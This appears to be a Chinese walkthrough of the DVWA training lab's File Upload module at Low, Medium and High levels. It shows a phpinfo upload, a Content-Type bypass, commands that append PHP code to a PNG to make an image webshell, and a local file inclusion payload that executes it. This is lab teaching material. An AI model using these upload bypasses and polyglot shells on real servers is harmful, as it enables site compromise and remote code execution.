@@ -1,0 +1,73 @@
+# 链接(URL)：https://www.wuyini.cn/672.html
+
+File Upload 文件上传
+Low
+直接看代码，就是一个正常的上传代码，没有做任何的过滤措施，上传啥文件都OK，并且也输出了上传路径信息了。
+
+上传一个 phpinfo.php 内容如下：Php
+
+<?php phpinfo();?>
+
+获取到上传路径后直接访问看看：Payload
+
+http://127.0.0.1:8888/vulnerabilities/upload/../../hackable/uploads/phpinfp.php
+最后实际上访问的是如下 URL：Payload
+
+http://127.0.0.1:8888/hackable/uploads/phpinfp.php
+
+Medium
+Medium 级别的防护代码如下：Php
+
+// 获取文件名、文件类型、以及文件大小
+$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
+$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+ 
+// 文件类型 image/jpeg 或者 image/png 且 文件大小小于 100000
+if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
+   ( $uploaded_size < 100000 ) ) {
+这里只进行了 Content-Type 类型校验，我们正常上传 php 文件，然后直接将其 文件类型修改为 image/png:
+
+
+即可正常上传
+
+High
+High 级别的关键代码如下：Php
+
+// h获取文件名、文件后缀、文件大小
+$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
+$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
+ 
+// 文件后缀是否是  jpg jpeg png 且文件大小 小于 100000
+if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
+   ( $uploaded_size < 100000 ) &&
+ 
+   // 使用 getimagesize 函数进行图片检测
+   getimagesize( $uploaded_tmp ) ) {
+      上传图片
+      }
+getimagesize 函数会检测文件是否是图片，所以这里我们得通过制作图马来绕过这个函数检测。
+
+Linux 下 图马制作
+Bash
+
+# 将 shell.php 内容追加到 pic.png
+cat shell.php >> pic.png
+ 
+# png + php 合成 png 图马
+cat pic.png shell.php >> shell.png
+ 
+# 直接 echo 追加
+echo '<?php phpinfo();?>' >> pic.png
+Windows 下 图马制作
+copy pic.png/b+shell.php/a shell.png
+图马制作完成之后我们就已经可以绕过 getimagesize 函数的检测了，接下来主要是绕过对后缀的检测。这里暂时无法绕过检测，目前只能借助文件包含或者命令执行漏洞来进一步 Getshell 下面演示文件包含漏洞
+
+首先正常上传我们的图马：
+
+
+接着直接进行文件包含解析图马：Payload
+
+/fi/?page=file:///var/www/html/hackable/uploads/pic.png
